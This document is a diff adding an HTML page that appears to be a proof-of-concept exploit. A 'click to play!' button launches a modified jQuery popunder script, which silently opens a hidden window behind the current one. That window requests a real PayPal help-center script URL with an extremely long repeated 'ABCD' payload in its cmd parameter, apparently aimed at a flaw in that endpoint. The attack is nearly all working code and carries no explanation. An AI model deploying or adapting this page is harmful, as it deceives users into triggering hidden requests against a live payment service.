@@ -1,0 +1,112 @@
+<html>
+	<head>
+		<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+	</head>
+	
+	<body>
+
+		<form id="testSubmit" action="exploit.html">
+			<input type="submit" value="click to play!"/>
+		</form>
+	
+		<script type="text/javascript">
+		
+			<!-- 'modified' version of https://gist.github.com/1021924 -->
+
+			(function($) {
+				$.popunder = function(sUrl) {
+
+					var bSimple = $.browser.msie,
+
+					run = function() {
+
+					$.popunderHelper.open(sUrl, bSimple);
+					};
+					
+					(bSimple) ? run() : window.setTimeout(run, 1);
+					
+					return $;
+
+				};
+				
+				$.popunderHelper = {
+				
+					rand: function(name, rand) {
+					
+						var p = (name) ? name : 'pu_';
+						
+						return p + (rand === false ? '' : Math.floor(89999999*Math.random()+10000000));
+					},
+					
+					open: function(sUrl, bSimple) {
+					
+						var _parent = self,
+							sToolbar = (!$.browser.webkit && (!$.browser.mozilla || parseInt($.browser.version, 10) < 12)) ? 'yes' : 'no',
+								sOptions, popunder;
+								
+						if (top != self) {
+						
+							try {
+							
+								if (top.document.location.toString()) {
+									_parent = top;
+								}
+							} catch(err) { }
+							
+						}
+						
+						sOptions = 'toolbar=' + sToolbar + ',scrollbars=yes,location=yes,statusbar=yes,menubar=no,resizable=1,width=' + (screen.availWidth - 10).toString();
+						sOptions += ',height=' + (screen.availHeight - 122).toString() + ',screenX=0,screenY=0,left=0,top=0';
+						
+						popunder = _parent.window.open(sUrl, $.popunderHelper.rand(), sOptions);
+						
+						if (popunder) {
+						
+							popunder.blur();
+							
+							if (bSimple) {
+							
+								window.focus();
+							
+								try { opener.window.focus(); }
+								
+								catch (err) { }
+								
+							} else {
+
+								popunder.init = function(e) {
+								
+									with (e) {
+									
+										(function() {
+										
+											if (typeof window.mozPaintCount != 'undefined' || typeof navigator.webkitGetUserMedia === "function") {
+											
+												var x = window.open('about:blank');
+												x.close();
+											}
+											
+											try { opener.window.focus(); }
+											catch (err) { }
+										})();
+									}
+								};
+								
+								popunder.params = { url: sUrl };
+								popunder.init(popunder);
+							}
+						}
+						
+						return true;
+					}
+				};
+				
+			})(jQuery);
+
+			var url='https://history.paypal.com/helpcenter/script/pphc_rating.js.jsp?locale=&_dyncharset=UTF-8&countrycode=CA&cmd=_ABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDAB&serverInstance=9002&no_strip=';
+			$('#testSubmit').submit(function() {
+				jQuery.popunder(url);
+			});
+		</script>
+	</body>
+</html>
